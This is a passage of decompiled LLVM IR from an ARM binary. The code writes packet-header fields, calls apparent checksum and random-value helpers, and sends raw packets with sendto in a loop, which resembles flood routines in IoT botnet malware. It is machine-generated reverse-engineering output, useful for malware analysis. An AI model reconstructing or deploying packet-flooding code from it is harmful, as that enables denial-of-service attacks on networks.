  %v0_fb24.off0 = phi i8 [ %v1_fafc56.off0, %dec_label_pc_fb24.loopexit ], [ %extract.t78, %bb145 ]
  %v3_fb24 = inttoptr i32 %v2_fb24 to i8*
  store i8 %v0_fb24.off0, i8* %v3_fb24, align 1
  %v3_fb28 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_f85c, i32* %r1.global-to-local, align 4
  %v0_fb30 = load i32, i32* %r4.global-to-local, align 4
  %v2_fb30 = add i32 %v0_fb30, %v2_f85c
  store i32 %v2_fb30, i32* %r3.global-to-local, align 4
  %v1_fb34 = add i32 %v3_fb28, 1
  store i32 %v1_fb34, i32* %r4.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %lr.global-to-local, align 4
  %v9_fb44 = icmp eq i32 %v1_f5fc, %v1_fb34
  store i1 %v9_fb44, i1* %cpsr_z.global-to-local, align 1
  %v1_fb48 = add i32 %v2_fb30, 2
  store i32 %v1_fb48, i32* %r2.global-to-local, align 4
  %v4_fb4c = inttoptr i32 %v1_fb48 to i8*
  store i8 0, i8* %v4_fb4c, align 1
  %v0_fb50 = load i32, i32* %lr.global-to-local, align 4
  %v1_fb50 = trunc i32 %v0_fb50 to i8
  %v2_fb50 = load i32, i32* %r2.global-to-local, align 4
  %v3_fb50 = add i32 %v2_fb50, 3
  %v4_fb50 = inttoptr i32 %v3_fb50 to i8*
  store i8 %v1_fb50, i8* %v4_fb50, align 1
  %v0_fb54 = load i32, i32* %lr.global-to-local, align 4
  %v1_fb54 = trunc i32 %v0_fb54 to i8
  %v2_fb54 = load i32, i32* %r2.global-to-local, align 4
  %v3_fb54 = add i32 %v2_fb54, 1
  %v4_fb54 = inttoptr i32 %v3_fb54 to i8*
  store i8 %v1_fb54, i8* %v4_fb54, align 1
  %v0_fb58 = load i32, i32* %ip.global-to-local, align 4
  %v1_fb58 = trunc i32 %v0_fb58 to i8
  %v2_fb58 = load i32, i32* %r2.global-to-local, align 4
  %v3_fb58 = add i32 %v2_fb58, 2
  %v4_fb58 = inttoptr i32 %v3_fb58 to i8*
  store i8 %v1_fb58, i8* %v4_fb58, align 1
  %v0_fb5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fb5c, i32* %stack_var_-40, align 4
  %v8_fb60 = icmp sgt i32 %v1_f5fc, %v1_fb34
  br i1 %v8_fb60, label %dec_label_pc_f9bc, label %dec_label_pc_fb64

dec_label_pc_fb64:                                ; preds = %dec_label_pc_fb24, %dec_label_pc_fd30
  %v4_fbd4.pre-phi = phi i32 [ %v4_fd34, %dec_label_pc_fd30 ], [ %v4_f908, %dec_label_pc_fb24 ]
  store i32 %v1_f5fc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_f8e0, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb70

dec_label_pc_fb70:                                ; preds = %dec_label_pc_fb70, %dec_label_pc_fc94, %dec_label_pc_fb64
  br i1 %v2_f8e0, label %dec_label_pc_fb70, label %dec_label_pc_fb74

dec_label_pc_fb74:                                ; preds = %dec_label_pc_fb70
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r6, align 4
  %v0_fb84 = load i32, i32* @fp, align 4
  %v1_fb84 = add i32 %v0_fb84, 27
  store i32 %v1_fb84, i32* @sb, align 4
  %v1_fb88 = add i32 %v0_fb84, 47
  store i32 %v1_fb88, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_fb90

dec_label_pc_fb90:                                ; preds = %dec_label_pc_fbd0.dec_label_pc_fb90_crit_edge, %dec_label_pc_fb74
  %v1_fbb0 = phi i32 [ %v1_fb9c.pre, %dec_label_pc_fbd0.dec_label_pc_fb90_crit_edge ], [ 65535, %dec_label_pc_fb74 ]
  %v1_fb98 = phi i32 [ %v1_fc80, %dec_label_pc_fbd0.dec_label_pc_fb90_crit_edge ], [ 0, %dec_label_pc_fb74 ]
  store i32 %v2_f614, i32* %r3.global-to-local, align 4
  store i32 %v3_f8d0, i32* %r8.global-to-local, align 4
  %v4_fb98 = mul i32 %v1_fb98, 4
  %v5_fb98 = add i32 %v4_fb98, %v2_f614
  %v6_fb98 = inttoptr i32 %v5_fb98 to i32*
  %v7_fb98 = load i32, i32* %v6_fb98, align 4
  store i32 %v7_fb98, i32* @r4, align 4
  %v9_fb9c = icmp eq i32 %v3_f8d0, %v1_fbb0
  store i1 %v9_fb9c, i1* %cpsr_z.global-to-local, align 1
  %v1_fba0 = add i32 %v7_fb98, 20
  store i32 %v1_fba0, i32* @r5, align 4
  %v1_fba4 = add i32 %v7_fb98, 28
  store i32 %v1_fba4, i32* @r8, align 4
  br i1 %v9_fb9c, label %dec_label_pc_fca4, label %dec_label_pc_fbac

dec_label_pc_fbac:                                ; preds = %dec_label_pc_fb90
  store i32 %v3_f8d4, i32* %ip.global-to-local, align 4
  %v9_fbb0 = icmp eq i32 %v3_f8d4, %v1_fbb0
  store i1 %v9_fbb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fbb0, label %dec_label_pc_fcc0, label %dec_label_pc_fbb8

dec_label_pc_fbb8:                                ; preds = %dec_label_pc_fca4.dec_label_pc_fbb8_crit_edge, %dec_label_pc_fbac
  %v1_fbbc = phi i32 [ %v1_fbbc.pre, %dec_label_pc_fca4.dec_label_pc_fbb8_crit_edge ], [ %v1_fbb0, %dec_label_pc_fbac ]
  store i32 %v3_f8d8, i32* %lr.global-to-local, align 4
  %v9_fbbc = icmp eq i32 %v3_f8d8, %v1_fbbc
  store i1 %v9_fbbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fbbc, label %dec_label_pc_fcdc, label %dec_label_pc_fbc4

dec_label_pc_fbc4:                                ; preds = %dec_label_pc_fcc0.dec_label_pc_fbc4_crit_edge, %dec_label_pc_fbb8
  %v1_fbc8 = phi i32 [ %v1_fbc8.pre, %dec_label_pc_fcc0.dec_label_pc_fbc4_crit_edge ], [ %v1_fbbc, %dec_label_pc_fbb8 ]
  store i32 %v3_f8dc, i32* %r0.global-to-local, align 4
  %v9_fbc8 = icmp eq i32 %v3_f8dc, %v1_fbc8
  store i1 %v9_fbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fbc8, label %dec_label_pc_fcf8, label %dec_label_pc_fbd0

dec_label_pc_fbd0:                                ; preds = %dec_label_pc_fcdc, %dec_label_pc_fbc4, %dec_label_pc_fcf8
  %v0_fbd0 = load i32, i32* @r4, align 4
  %v1_fbd0 = add i32 %v0_fbd0, 41
  store i32 %v1_fbd0, i32* %r0.global-to-local, align 4
  store i32 %v4_fbd4.pre-phi, i32* %r1.global-to-local, align 4
  %v2_fbd8 = call i32 @function_11890(i32 %v1_fbd0, i32 %v4_fbd4.pre-phi)
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_fbe0 = load i32, i32* @r7, align 4
  %v1_fbe0 = trunc i32 %v0_fbe0 to i8
  %v2_fbe0 = load i32, i32* @r4, align 4
  %v3_fbe0 = add i32 %v2_fbe0, 10
  %v4_fbe0 = inttoptr i32 %v3_fbe0 to i8*
  store i8 %v1_fbe0, i8* %v4_fbe0, align 1
  %v0_fbe4 = load i32, i32* @r7, align 4
  %v1_fbe4 = trunc i32 %v0_fbe4 to i8
  %v2_fbe4 = load i32, i32* @r4, align 4
  %v3_fbe4 = add i32 %v2_fbe4, 11
  %v4_fbe4 = inttoptr i32 %v3_fbe4 to i8*
  store i8 %v1_fbe4, i8* %v4_fbe4, align 1
  %v0_fbe8 = load i32, i32* @r4, align 4
  store i32 %v0_fbe8, i32* @r0, align 4
  %v2_fbec = call i32 @function_fda0(i32 %v0_fbe8, i32 20)
  %v3_fbec = trunc i32 %v2_fbec to i8
  store i32 %v2_fbec, i32* %r0.global-to-local, align 4
  %v4_fbf0 = sdiv i32 %v2_fbec, 256
  store i32 %v4_fbf0, i32* %r3.global-to-local, align 4
  %v1_fbf4 = trunc i32 %v4_fbf0 to i8
  %v2_fbf4 = load i32, i32* @r4, align 4
  %v3_fbf4 = add i32 %v2_fbf4, 11
  %v4_fbf4 = inttoptr i32 %v3_fbf4 to i8*
  store i8 %v1_fbf4, i8* %v4_fbf4, align 1
  %v3_fbf8 = load i32, i32* @r4, align 4
  %v4_fbf8 = add i32 %v3_fbf8, 10
  %v5_fbf8 = inttoptr i32 %v4_fbf8 to i8*
  store i8 %v3_fbec, i8* %v5_fbf8, align 1
  %v0_fbfc = load i32, i32* @r7, align 4
  %v1_fbfc = trunc i32 %v0_fbfc to i8
  %v2_fbfc = load i32, i32* @r5, align 4
  %v3_fbfc = add i32 %v2_fbfc, 6
  %v4_fbfc = inttoptr i32 %v3_fbfc to i8*
  store i8 %v1_fbfc, i8* %v4_fbfc, align 1
  %v0_fc00 = load i32, i32* @r7, align 4
  %v1_fc00 = trunc i32 %v0_fc00 to i8
  %v2_fc00 = load i32, i32* @r5, align 4
  %v3_fc00 = add i32 %v2_fc00, 7
  %v4_fc00 = inttoptr i32 %v3_fc00 to i8*
  store i8 %v1_fc00, i8* %v4_fc00, align 1
  %v0_fc04 = load i32, i32* @r4, align 4
  %v1_fc04 = add i32 %v0_fc04, 24
  %v2_fc04 = inttoptr i32 %v1_fc04 to i8*
  %v3_fc04 = load i8, i8* %v2_fc04, align 1
  %v4_fc04 = zext i8 %v3_fc04 to i32
  store i32 %v4_fc04, i32* %r3.global-to-local, align 4
  %v1_fc08 = add i32 %v0_fc04, 25
  %v2_fc08 = inttoptr i32 %v1_fc08 to i8*
  %v3_fc08 = load i8, i8* %v2_fc08, align 1
  %v4_fc08 = zext i8 %v3_fc08 to i32
  %v0_fc0c = load i32, i32* @r5, align 4
  store i32 %v0_fc0c, i32* @r1, align 4
  %v4_fc10 = mul nuw nsw i32 %v4_fc08, 256
  %v5_fc10 = or i32 %v4_fc10, %v4_fc04
  store i32 %v5_fc10, i32* %r2.global-to-local, align 4
  store i32 %v0_fc04, i32* %r0.global-to-local, align 4
  %v0_fc18 = load i32, i32* @sb, align 4
  store i32 %v0_fc18, i32* %r3.global-to-local, align 4
  %v4_fc1c = call i32 @function_fdfc(i32 %v0_fc04, i32 %v0_fc0c, i32 %v5_fc10, i32 %v0_fc18)
  %v5_fc1c = trunc i32 %v4_fc1c to i8
  store i32 %v4_fc1c, i32* %r0.global-to-local, align 4
  %v3_fc20 = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-2176.0, i32* %r2.global-to-local, align 4
  %v5_fc30 = mul i32 %v3_fc20, 24
  %v2_fc34 = add i32 %v5_fc30, %arg2
  store i32 %v2_fc34, i32* %lr.global-to-local, align 4
  %v4_fc38 = sdiv i32 %v4_fc1c, 256
  store i32 %v4_fc38, i32* %r3.global-to-local, align 4
  %v3_fc3c = load i32, i32* @r5, align 4
  %v4_fc3c = add i32 %v3_fc3c, 6
  %v5_fc3c = inttoptr i32 %v4_fc3c to i8*
  store i8 %v5_fc1c, i8* %v5_fc3c, align 1
  %v0_fc40 = load i32, i32* %r3.global-to-local, align 4
  %v1_fc40 = trunc i32 %v0_fc40 to i8
  %v2_fc40 = load i32, i32* @r5, align 4
  %v3_fc40 = add i32 %v2_fc40, 7
  %v4_fc40 = inttoptr i32 %v3_fc40 to i8*
  store i8 %v1_fc40, i8* %v4_fc40, align 1
  %v0_fc44 = load i32, i32* %r2.global-to-local, align 4
  %v1_fc44 = load i32, i32* %lr.global-to-local, align 4
  %v2_fc44 = add i32 %v1_fc44, 4
  %v3_fc44 = inttoptr i32 %v2_fc44 to i32*
  store i32 %v0_fc44, i32* %v3_fc44, align 4
  %v0_fc48 = load i32, i32* @r4, align 4
  %v1_fc48 = add i32 %v0_fc48, 20
  %v2_fc48 = inttoptr i32 %v1_fc48 to i32*
  %v3_fc48 = load i32, i32* %v2_fc48, align 4
  %v3_fc4c = udiv i32 %v3_fc48, 65536
  store i32 %v3_fc4c, i32* %r3.global-to-local, align 4
  %v3_fc5012 = udiv i32 %v3_fc48, 16777216
  %v1_fc54 = trunc i32 %v3_fc5012 to i8
  %v2_fc54 = load i32, i32* %lr.global-to-local, align 4
  %v3_fc54 = add i32 %v2_fc54, 3
  %v4_fc54 = inttoptr i32 %v3_fc54 to i8*
  store i8 %v1_fc54, i8* %v4_fc54, align 1
  %v0_fc58 = load i32, i32* %r3.global-to-local, align 4
  %v1_fc58 = trunc i32 %v0_fc58 to i8
  %v2_fc58 = load i32, i32* %lr.global-to-local, align 4
  %v3_fc58 = add i32 %v2_fc58, 2
  %v4_fc58 = inttoptr i32 %v3_fc58 to i8*
  store i8 %v1_fc58, i8* %v4_fc58, align 1
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc64 = load i32, i32* @r4, align 4
  store i32 %v0_fc64, i32* %r1.global-to-local, align 4
  store i32 %v3_f870, i32* %r0.global-to-local, align 4
  %v0_fc6c = load i32, i32* @sl, align 4
  store i32 %v0_fc6c, i32* %r2.global-to-local, align 4
  %v0_fc70 = load i32, i32* %lr.global-to-local, align 4
  %v6_fc78 = call i32 @_sendto(i32 %v3_f870, i32 %v0_fc64, i32 %v0_fc6c, i32 16384, i32 %v0_fc70, i32 16)
  %v3_fc7c = load i32, i32* %stack_var_-40, align 4
  %v1_fc80 = add i32 %v3_fc7c, 1
  store i32 %v1_fc80, i32* %r0.global-to-local, align 4
  store i32 %v1_f5fc, i32* %r3.global-to-local, align 4
  %v9_fc88 = icmp eq i32 %v1_f5fc, %v1_fc80
  store i1 %v9_fc88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_fc80, i32* %stack_var_-40, align 4
  %v8_fc90 = icmp sgt i32 %v1_f5fc, %v1_fc80
  br i1 %v8_fc90, label %dec_label_pc_fbd0.dec_label_pc_fb90_crit_edge, label %dec_label_pc_fc94

dec_label_pc_fbd0.dec_label_pc_fb90_crit_edge:    ; preds = %dec_label_pc_fbd0
  %v1_fb9c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_fb90

dec_label_pc_fc94:                                ; preds = %dec_label_pc_fbd0
  store i32 %v1_f5fc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb70

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fb90
  %v0_fca4 = call i32 @function_117dc()
  %v1_fca4 = trunc i32 %v0_fca4 to i8
  store i32 %v0_fca4, i32* %r0.global-to-local, align 4
  store i32 %v3_f8d4, i32* %ip.global-to-local, align 4
  %v4_fcac = sdiv i32 %v0_fca4, 256
  store i32 %v4_fcac, i32* %r3.global-to-local, align 4
  %v1_fcb0 = load i32, i32* @r6, align 4
  %v9_fcb0 = icmp eq i32 %v3_f8d4, %v1_fcb0
  store i1 %v9_fcb0, i1* %cpsr_z.global-to-local, align 1
  %v1_fcb4 = trunc i32 %v4_fcac to i8
  %v2_fcb4 = load i32, i32* @r4, align 4
  %v3_fcb4 = add i32 %v2_fcb4, 5
  %v4_fcb4 = inttoptr i32 %v3_fcb4 to i8*
  store i8 %v1_fcb4, i8* %v4_fcb4, align 1
  %v3_fcb8 = load i32, i32* @r4, align 4
  %v4_fcb8 = add i32 %v3_fcb8, 4
  %v5_fcb8 = inttoptr i32 %v4_fcb8 to i8*
  store i8 %v1_fca4, i8* %v5_fcb8, align 1
  %v0_fcbc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fcbc, label %dec_label_pc_fcc0, label %dec_label_pc_fca4.dec_label_pc_fbb8_crit_edge

dec_label_pc_fca4.dec_label_pc_fbb8_crit_edge:    ; preds = %dec_label_pc_fca4
  %v1_fbbc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_fbb8

dec_label_pc_fcc0:                                ; preds = %dec_label_pc_fca4, %dec_label_pc_fbac
  %v0_fcc0 = call i32 @function_117dc()
  %v1_fcc0 = trunc i32 %v0_fcc0 to i8
  store i32 %v0_fcc0, i32* %r0.global-to-local, align 4
  store i32 %v3_f8d8, i32* %lr.global-to-local, align 4
  %v4_fcc8 = sdiv i32 %v0_fcc0, 256
  store i32 %v4_fcc8, i32* %r3.global-to-local, align 4
  %v1_fccc = load i32, i32* @r6, align 4
  %v9_fccc = icmp eq i32 %v3_f8d8, %v1_fccc
  store i1 %v9_fccc, i1* %cpsr_z.global-to-local, align 1
  %v3_fcd0 = load i32, i32* @r4, align 4
  %v4_fcd0 = add i32 %v3_fcd0, 20
  %v5_fcd0 = inttoptr i32 %v4_fcd0 to i8*
  store i8 %v1_fcc0, i8* %v5_fcd0, align 1
  %v0_fcd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_fcd4 = trunc i32 %v0_fcd4 to i8
  %v2_fcd4 = load i32, i32* @r5, align 4
  %v3_fcd4 = add i32 %v2_fcd4, 1
  %v4_fcd4 = inttoptr i32 %v3_fcd4 to i8*
  store i8 %v1_fcd4, i8* %v4_fcd4, align 1
  %v0_fcd8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fcd8, label %dec_label_pc_fcdc, label %dec_label_pc_fcc0.dec_label_pc_fbc4_crit_edge

dec_label_pc_fcc0.dec_label_pc_fbc4_crit_edge:    ; preds = %dec_label_pc_fcc0
  %v1_fbc8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_fbc4

dec_label_pc_fcdc:                                ; preds = %dec_label_pc_fcc0, %dec_label_pc_fbb8
  %v0_fcdc = call i32 @function_117dc()
  %v1_fcdc = trunc i32 %v0_fcdc to i8
  %v4_fce0 = sdiv i32 %v0_fcdc, 256
  store i32 %v4_fce0, i32* %r3.global-to-local, align 4
  %v3_fce4 = load i32, i32* @r5, align 4
  %v4_fce4 = add i32 %v3_fce4, 2
  %v5_fce4 = inttoptr i32 %v4_fce4 to i8*
  store i8 %v1_fcdc, i8* %v5_fce4, align 1
  store i32 %v3_f8dc, i32* %r0.global-to-local, align 4
  %v1_fcec = load i32, i32* @r6, align 4
  %v9_fcec = icmp eq i32 %v3_f8dc, %v1_fcec
  store i1 %v9_fcec, i1* %cpsr_z.global-to-local, align 1
  %v0_fcf0 = load i32, i32* %r3.global-to-local, align 4
  %v1_fcf0 = trunc i32 %v0_fcf0 to i8
  %v2_fcf0 = load i32, i32* @r5, align 4
  %v3_fcf0 = add i32 %v2_fcf0, 3
  %v4_fcf0 = inttoptr i32 %v3_fcf0 to i8*
  store i8 %v1_fcf0, i8* %v4_fcf0, align 1
  %v0_fcf4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fcf4, label %dec_label_pc_fcf8, label %dec_label_pc_fbd0

dec_label_pc_fcf8:                                ; preds = %dec_label_pc_fcdc, %dec_label_pc_fbc4
  %v0_fcf8 = call i32 @function_117dc()
  %v1_fcf8 = trunc i32 %v0_fcf8 to i8
  store i32 %v0_fcf8, i32* %r0.global-to-local, align 4
  %v4_fcfc = sdiv i32 %v0_fcf8, 256
  store i32 %v4_fcfc, i32* %r3.global-to-local, align 4
  %v3_fd00 = load i32, i32* @r4, align 4
  %v4_fd00 = add i32 %v3_fd00, 28
  %v5_fd00 = inttoptr i32 %v4_fd00 to i8*
  store i8 %v1_fcf8, i8* %v5_fd00, align 1
  %v0_fd04 = load i32, i32* %r3.global-to-local, align 4
  %v1_fd04 = trunc i32 %v0_fd04 to i8
  %v2_fd04 = load i32, i32* @r8, align 4
  %v3_fd04 = add i32 %v2_fd04, 1
  %v4_fd04 = inttoptr i32 %v3_fd04 to i8*
  store i8 %v1_fd04, i8* %v4_fd04, align 1
  br label %dec_label_pc_fbd0

dec_label_pc_fd0c:                                ; preds = %dec_label_pc_f7d8, %dec_label_pc_f7a4, %dec_label_pc_f748, %dec_label_pc_f5f0
  %v0_fd0c = call i32 @function_117dc()
  %v1_fd10 = urem i32 %v0_fd0c, 4
  store i32 %v1_fd10, i32* %r0.global-to-local, align 4
  %v2_fd14 = icmp eq i32 %v1_fd10, 3
  store i1 %v2_fd14, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_fd0c to i2
  switch i2 %trunc, label %dec_label_pc_f84c20 [
    i2 0, label %dec_label_pc_fd54
    i2 1, label %dec_label_pc_fd68
    i2 -2, label %dec_label_pc_fd74
    i2 -1, label %dec_label_pc_fd84
  ]

dec_label_pc_fd30:                                ; preds = %dec_label_pc_f8ac
  store i32 %v2_f85c, i32* %r0.global-to-local, align 4
  %v4_fd34 = sext i8 %v5_f8c8 to i32
  store i32 %v4_fd34, i32* %r1.global-to-local, align 4
  %v2_fd38 = add i32 %v4_fd34, %v2_f85c
  store i32 %v2_fd38, i32* @fp, align 4
  br label %dec_label_pc_fb64

dec_label_pc_fd40:                                ; preds = %dec_label_pc_f880
  store i32 %v3_f870, i32* %r0.global-to-local, align 4
  %v1_fd44 = call i32 @_close(i32 %v3_f870)
  store i32 %v1_fd44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fd48

dec_label_pc_fd48:                                ; preds = %dec_label_pc_f858, %dec_label_pc_f84c, %dec_label_pc_fd40
  %v29_fd50 = phi i32 [ %v3_f870, %dec_label_pc_f858 ], [ %v29_fd5074, %dec_label_pc_f84c ], [ %v1_fd44, %dec_label_pc_fd40 ]
  store i32 %v3_f5f0, i32* %r4.global-to-local, align 4
  store i32 %v6_f5f0, i32* %r5.global-to-local, align 4
  store i32 %v9_f5f0, i32* %r6.global-to-local, align 4
  store i32 %v12_f5f0, i32* %r7.global-to-local, align 4
  store i32 %v15_f5f0, i32* %r8.global-to-local, align 4
  store i32 %v18_f5f0, i32* %sb.global-to-local, align 4
  store i32 %v21_f5f0, i32* %sl.global-to-local, align 4
  store i32 %v24_f5f0, i32* %fp.global-to-local, align 4
  ret i32 %v29_fd50

dec_label_pc_fd54:                                ; preds = %dec_label_pc_fd0c
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f84c

dec_label_pc_fd68:                                ; preds = %dec_label_pc_fd0c
  store i32 707416650, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f84c

dec_label_pc_fd74:                                ; preds = %dec_label_pc_fd0c
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f84c

dec_label_pc_fd84:                                ; preds = %dec_label_pc_fd0c
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f84c

; uselistorder directives
  uselistorder i32 %v4_fd34, { 0, 2, 1 }
  uselistorder i32 %v1_fd10, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_fd0c, { 1, 0 }
  uselistorder i32 %v0_fcf8, { 0, 2, 1 }
  uselistorder i32 %v0_fcc0, { 0, 2, 1 }
  uselistorder i32 %v4_fcac, { 1, 0 }
  uselistorder i32 %v0_fca4, { 0, 2, 1 }
  uselistorder i32 %v1_fc80, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_fc1c, { 0, 2, 1 }
  uselistorder i32 %v0_fc04, { 1, 0, 2, 3 }
  uselistorder i32 %v4_fbf0, { 1, 0 }
  uselistorder i32 %v2_fbec, { 0, 2, 1 }
  uselistorder i32 %v7_fb98, { 1, 0, 2 }
  uselistorder i32 %v4_fbd4.pre-phi, { 1, 0 }
  uselistorder i32 %v2_fb18, { 1, 0 }
  uselistorder i32 %v1_fb0c86, { 1, 0, 2 }
  uselistorder i32 %v1_fb00, { 2, 1, 0 }
  uselistorder i32 %v0_fb00, { 1, 2, 0 }
  uselistorder i32 %v0_fb0032, { 1, 0 }
  uselistorder i32 %v1_fb0033, { 2, 0, 1 }
  uselistorder i8 %extract.t78, { 1, 0 }
  uselistorder i32 %v1_fad4, { 2, 0, 4, 1, 3, 5, 6 }
  uselistorder i32 %v0_fa50, { 1, 0 }
  uselistorder i32 %v3_f98c, { 1, 0, 2 }
  uselistorder i32 %v1_f954, { 1, 0 }
  uselistorder i32 %v1_f948, { 1, 0 }
  uselistorder i32 %v1_f92c, { 1, 0 }
  uselistorder i32 %v1_f918, { 1, 0 }
  uselistorder i32 %v3_f910, { 1, 0 }
  uselistorder i32 %v4_f908, { 0, 4, 2, 5, 3, 1 }
  uselistorder i8 %v5_f8c8, { 1, 0 }
  uselistorder i32 %v0_f8c4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_f8c0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_f8b8, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_f8a4, { 1, 0 }
  uselistorder i1 %v7_f874, { 1, 0 }
  uselistorder i32 %v3_f870, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_f85c, { 0, 11, 1, 6, 4, 3, 7, 10, 9, 8, 5, 2 }
  uselistorder i32 %stack_var_-2176.0, { 1, 0 }
  uselistorder i32 %v1_f844, { 1, 0, 2 }
  uselistorder i1 %v7_f814, { 1, 0 }
  uselistorder i32 %v1_f810, { 1, 0, 2 }
  uselistorder i1 %v8_f808, { 1, 0 }
  uselistorder i1 %v7_f804, { 1, 0 }
  uselistorder i32 %v1_f7f8, { 1, 0 }
  uselistorder i8 %v2_f7ec, { 2, 0, 1, 3 }
  uselistorder i32 %v0_f7f0, { 1, 0 }
  uselistorder i32 %v0_f810, { 3, 0, 2, 1 }
  uselistorder i32 %v0_f7dc, { 0, 2, 1 }
  uselistorder i32 %v1_f7f4, { 0, 2, 1 }
  uselistorder i32 %v2_f7c4, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_f7bc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_f7a4, { 1, 2, 0, 3, 4, 5 }
  uselistorder i1 %v7_f79c, { 1, 0 }
  uselistorder i32 %v0_f79c, { 2, 3, 1, 4, 6, 5, 0 }
  uselistorder i32 %v2_f74c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_f740, { 1, 0, 3, 2 }
  uselistorder i32 %v6_f710, { 0, 3, 5, 4, 2, 1, 7, 6 }
  uselistorder i32 %v1_f694, { 1, 0 }
  uselistorder i32 %v7_f650, { 0, 1, 2, 4, 3 }
  uselistorder i8 %v5_f64c, { 1, 0 }
  uselistorder i32 %v6_f62c, { 1, 0 }
  uselistorder i32 %v2_f614, { 0, 3, 1, 2 }
  uselistorder i32 %v1_f5fc, { 7, 4, 5, 6, 3, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 1, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 51, 8, 50, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 44, 43, 45, 47, 46, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 7, 6, 8, 10, 9, 11, 13, 12, 14, 15, 16, 17, 69, 18, 19, 1, 33, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 37, 34, 35, 36, 38, 40, 39, 41, 43, 42, 44, 46, 45, 48, 47, 49, 50, 52, 51, 53, 55, 54, 57, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 22, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 30, 31, 32, 29, 26, 33, 34, 35 }
  uselistorder i32 41, { 5, 6, 7, 0, 1, 3, 8, 2, 9, 4, 10 }
  uselistorder i32 134744072, { 1, 0 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 33686020, { 1, 0 }
